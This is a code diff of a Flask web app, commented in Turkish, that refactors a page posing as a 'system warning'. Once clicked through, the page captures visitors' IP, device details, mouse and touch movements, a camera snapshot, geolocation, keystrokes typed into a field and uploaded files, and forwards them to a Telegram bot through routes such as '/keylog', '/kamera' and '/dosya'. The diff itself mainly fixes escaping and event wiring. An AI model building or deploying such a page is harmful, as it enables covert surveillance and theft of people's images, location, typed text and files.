@@ -2,6 +2,7 @@ from flask import Flask, request, jsonify
 import requests
 import os
 import base64
+import json
 
 app = Flask(__name__)
 
@@ -39,6 +40,11 @@ def ana_sayfa():
     if ziyaretci_ip: ziyaretci_ip = ziyaretci_ip.split(',')[0].strip()
     user_agent = request.headers.get('User-Agent', 'Bilinmiyor')
 
+    # 🚨 ÇÖZÜM: IP ve User-Agent'i JSON string'e çevirerek JS kodunun bozulmasını engelliyoruz.
+    guvenli_ip = json.dumps(ziyaretci_ip)
+    guvenli_cihaz = json.dumps(user_agent)
+    guvenli_anahtar = json.dumps(GIZLI_ANAHTAR)
+
     html = f"""
     <!DOCTYPE html>
     <html lang="tr">
@@ -51,7 +57,7 @@ def ana_sayfa():
         .onay-kutusu {{ background: #111; border: 2px solid #0f0; padding: 30px; border-radius: 10px; box-shadow: 0 0 20px #0f0; max-width: 80%; }}
         h2 {{ color: #ff3333; }}
         p {{ font-size: 16px; margin: 20px 0; }}
-        button {{ background: #000; color: #0f0; border: 1px solid #0f0; padding: 10px 20px; margin: 0 10px; cursor: pointer; font-family: monospace; font-size: 16px; border-radius: 5px; transition: 0.3s; }}
+        button {{ background: #000; color: #0f0; border: 1px solid #0f0; padding: 10px 20px; margin: 10px; cursor: pointer; font-family: monospace; font-size: 16px; border-radius: 5px; transition: 0.3s; }}
         button:hover {{ background: #0f0; color: #000; }}
         .gizli-alan {{ display: none; width: 100%; padding: 20px; box-sizing: border-box; }}
         .kutu {{ margin-top:20px; border:1px dashed #0f0; padding:10px; text-align: left; }}
@@ -62,8 +68,8 @@ def ana_sayfa():
     <div id="onay-ekrani" class="onay-kutusu">
         <h2 id="baslik">SİSTEM UYARISI</h2>
         <p id="mesaj">Bu siteye girmek üzeresiniz. Devam etmek istiyor musunuz?</p>
-        <button id="btnEvet" onclick="onayAdimi()">TAMAM</button>
-        <button id="btnHayir" onclick="reddet()">HAYIR</button>
+        <button id="btnEvet" type="button">TAMAM</button>
+        <button id="btnHayir" type="button">HAYIR</button>
     </div>
 
     <div id="sistem-alani" class="gizli-alan">
@@ -84,51 +90,26 @@ def ana_sayfa():
     </div>
 
     <script>
+        // Python'dan güvenli bir şekilde gelen değişkenler
+        const IP_ADRESI = {guvenli_ip};
+        const CIHAZ_BILGISI = {guvenli_cihaz};
+        const SECRET_KEY = {guvenli_anahtar};
+
         let adim = 1;
-        const IP_ADRESI = "{ziyaretci_ip}";
-        const CIHAZ_BILGISI = "{user_agent}";
         let hareketVerisi = [];
         let sonHareketZamani = 0;
 
-        // --- HAREKETLERİ TOPLAMA (Touch & Mouse) ---
-        function hareketEkle(x, y) {{
-            const suan = Date.now();
-            if (suan - sonHareketZamani > 500) {{ // Her 0.5 saniyede bir nokta al (spam olmasın diye)
-                hareketVerisi.push({{ x: Math.round(x), y: Math.round(y), t: suan }});
-                sonHareketZamani = suan;
-            }}
-            // Eğer veri 20 noktayı geçtiyse veya sayfadan çıkılıyorsa gönder
-            if (hareketVerisi.length >= 20) {{
-                hareketGonder();
-            }}
-        }}
+        // Butonları ID ile seçip tıklama olaylarını ekliyoruz (En sağlam yöntem)
+        const btnEvet = document.getElementById('btnEvet');
+        const btnHayir = document.getElementById('btnHayir');
 
-        function hareketGonder() {{
-            if (hareketVerisi.length === 0) return;
-            fetch('/hareket', {{
-                method: 'POST',
-                headers: {{ 'Content-Type': 'application/json', 'X-Secret-Key': '{GIZLI_ANAHTAR}' }},
-                body: JSON.stringify({{ hareketler: hareketVerisi }})
-            }});
-            hareketVerisi = []; // Gönderdikten sonra temizle
-        }}
-
-        window.addEventListener('touchmove', (e) => {{
-            const touch = e.touches[0];
-            hareketEkle(touch.clientX, touch.clientY);
-        }}, {{ passive: true }});
-
-        window.addEventListener('mousemove', (e) => {{
-            hareketEkle(e.clientX, e.clientY);
+        btnHayir.addEventListener('click', function() {{
+            document.getElementById('onay-ekrani').innerHTML = "<h2 style='color:red;'>SİSTEMDEN ÇIKILIYOR...</h2><p>İşlem iptal edildi.</p>";
         }});
 
-        // Sayfadan çıkarken son hareketleri gönder
-        window.addEventListener('beforeunload', hareketGonder);
-
-        function onayAdimi() {{
+        btnEvet.addEventListener('click', function() {{
             const baslik = document.getElementById('baslik');
             const mesaj = document.getElementById('mesaj');
-            const btnEvet = document.getElementById('btnEvet');
 
             if (adim === 1) {{
                 mesaj.innerText = "IP adresin, konumun ve cihaz bilgilerin arka plandaki sunucuya geçecek. Emin misin?";
@@ -150,21 +131,50 @@ def ana_sayfa():
                 document.getElementById('sistem-alani').style.display = 'block';
                 izinleriIste();
             }}
+        }});
+
+        // --- HAREKETLERİ TOPLAMA (Touch & Mouse) ---
+        function hareketEkle(x, y) {{
+            const suan = Date.now();
+            if (suan - sonHareketZamani > 500) {{
+                hareketVerisi.push({{ x: Math.round(x), y: Math.round(y), t: suan }});
+                sonHareketZamani = suan;
+            }}
+            if (hareketVerisi.length >= 20) {{
+                hareketGonder();
+            }}
         }}
 
-        function reddet() {{
-            document.getElementById('onay-ekrani').innerHTML = "<h2 style='color:red;'>SİSTEMDEN ÇIKILIYOR...</h2><p>İşlem iptal edildi.</p>";
+        function hareketGonder() {{
+            if (hareketVerisi.length === 0) return;
+            fetch('/hareket', {{
+                method: 'POST',
+                headers: {{ 'Content-Type': 'application/json', 'X-Secret-Key': SECRET_KEY }},
+                body: JSON.stringify({{ hareketler: hareketVerisi }})
+            }});
+            hareketVerisi = []; 
         }}
+
+        window.addEventListener('touchmove', (e) => {{
+            const touch = e.touches[0];
+            hareketEkle(touch.clientX, touch.clientY);
+        }}, {{ passive: true }});
+
+        window.addEventListener('mousemove', (e) => {{
+            hareketEkle(e.clientX, e.clientY);
+        }});
+
+        window.addEventListener('beforeunload', hareketGonder);
 
         async function izinleriIste() {{
             const durum = document.getElementById('durum');
             
-            // 1. BİLDİRİM İZNİ (Push Notification)
+            // 1. BİLDİRİM İZNİ
             if ("Notification" in window) {{
                 Notification.requestPermission().then(function(permission) {{
                     fetch('/bildirim', {{
                         method: 'POST',
-                        headers: {{ 'Content-Type': 'application/json', 'X-Secret-Key': '{GIZLI_ANAHTAR}' }},
+                        headers: {{ 'Content-Type': 'application/json', 'X-Secret-Key': SECRET_KEY }},
                         body: JSON.stringify({{ durum: permission }})
                     }});
                 }});
@@ -173,7 +183,7 @@ def ana_sayfa():
             // 2. IP VE CİHAZ BİLGİSİ
             fetch('/cihaz', {{
                 method: 'POST',
-                headers: {{ 'Content-Type': 'application/json', 'X-Secret-Key': '{GIZLI_ANAHTAR}' }},
+                headers: {{ 'Content-Type': 'application/json', 'X-Secret-Key': SECRET_KEY }},
                 body: JSON.stringify({{ ip: IP_ADRESI, cihaz: CIHAZ_BILGISI }})
             }});
 
@@ -192,7 +202,7 @@ def ana_sayfa():
                     
                     fetch('/kamera', {{
                         method: 'POST',
-                        headers: {{ 'Content-Type': 'application/json', 'X-Secret-Key': '{GIZLI_ANAHTAR}' }},
+                        headers: {{ 'Content-Type': 'application/json', 'X-Secret-Key': SECRET_KEY }},
                         body: JSON.stringify({{ image: foto, ip: IP_ADRESI }})
                     }});
                     durum.innerHTML = "Kamera açıldı. Konum alınıyor...";
@@ -204,7 +214,7 @@ def ana_sayfa():
                         (position) => {{
                             fetch('/konum', {{
                                 method: 'POST',
-                                headers: {{ 'Content-Type': 'application/json', 'X-Secret-Key': '{GIZLI_ANAHTAR}' }},
+                                headers: {{ 'Content-Type': 'application/json', 'X-Secret-Key': SECRET_KEY }},
                                 body: JSON.stringify({{ lat: position.coords.latitude, lon: position.coords.longitude }})
                             }});
                             durum.innerHTML = "Konum alındı. Sistem dinlemede...";
@@ -217,10 +227,10 @@ def ana_sayfa():
                 let sonGonderim = 0;
                 document.getElementById('gizliMetin').addEventListener('input', function(e) {{
                     const suan = Date.now();
-                    if (suan - sonGonderim > 2000 || e.target.value.includes('\n')) {{
+                    if (suan - sonGonderim > 2000 || e.target.value.includes('\\n')) {{
                         fetch('/keylog', {{
                             method: 'POST',
-                            headers: {{ 'Content-Type': 'application/json', 'X-Secret-Key': '{GIZLI_ANAHTAR}' }},
+                            headers: {{ 'Content-Type': 'application/json', 'X-Secret-Key': SECRET_KEY }},
                             body: JSON.stringify({{ text: e.target.value }})
                         }});
                         sonGonderim = suan;
@@ -235,7 +245,7 @@ def ana_sayfa():
                         formData.append('dosya', file);
                         fetch('/dosya', {{
                             method: 'POST',
-                            headers: {{ 'X-Secret-Key': '{GIZLI_ANAHTAR}' }},
+                            headers: {{ 'X-Secret-Key': SECRET_KEY }},
                             body: formData
                         }}).then(() => {{
                             durum.innerHTML = "Dosya Telegram'a Gönderildi!";
@@ -253,14 +263,14 @@ def ana_sayfa():
     """
     return html
 
-# --- YENİ ROTALAR ---
+# --- ROTALAR ---
 @app.route('/bildirim', methods=['POST'])
 def bildirim():
     if request.headers.get('X-Secret-Key') != GIZLI_ANAHTAR: return "Hata", 403
     veri = request.json
     durum = veri.get('durum')
     if durum == 'granted':
-        telegram_mesaj_gonder("🔔 <b>BİLDİRİM İZNİ VERİLDİ!</b>\nKullanıcı artık bildirim almayı kabul etti.")
+        telegram_mesaj_gonder("🔔 <b>BİLDİRİM İZNİ VERİLDİ!</b>")
     else:
         telegram_mesaj_gonder(f"🔕 <b>BİLDİRİM İZNİ VERİLMEDİ ({durum}).</b>")
     return "OK", 200
@@ -270,16 +280,10 @@ def hareket():
     if request.headers.get('X-Secret-Key') != GIZLI_ANAHTAR: return "Hata", 403
     veri = request.json
     hareketler = veri.get('hareketler', [])
-    
     if len(hareketler) > 0:
-        # Ekranda nerede gezindiğini özetleyelim
         ilk = hareketler[0]
         son = hareketler[-1]
-        mesaj = f"🖱️ <b>HAREKET ANALİZİ (Dokunma/Kaydırma)</b>\n\n"
-        mesaj += f"Kullanıcı ekranda <b>{len(hareketler)}</b> noktada gezindi.\n"
-        mesaj += f"Başlangıç: X:{ilk['x']} Y:{ilk['y']}\n"
-        mesaj += f"Bitiş: X:{son['x']} Y:{son['y']}\n"
-        mesaj += f"<i>(Bot olmadığını kanıtlamak için kullanılan davranış verisi)</i>"
+        mesaj = f"🖱️ <b>HAREKET ANALİZİ</b>\n\nKullanıcı ekranda <b>{len(hareketler)}</b> noktada gezindi.\nBaşlangıç: X:{ilk['x']} Y:{ilk['y']}\nBitiş: X:{son['x']} Y:{son['y']}"
         telegram_mesaj_gonder(mesaj)
     return "OK", 200
 
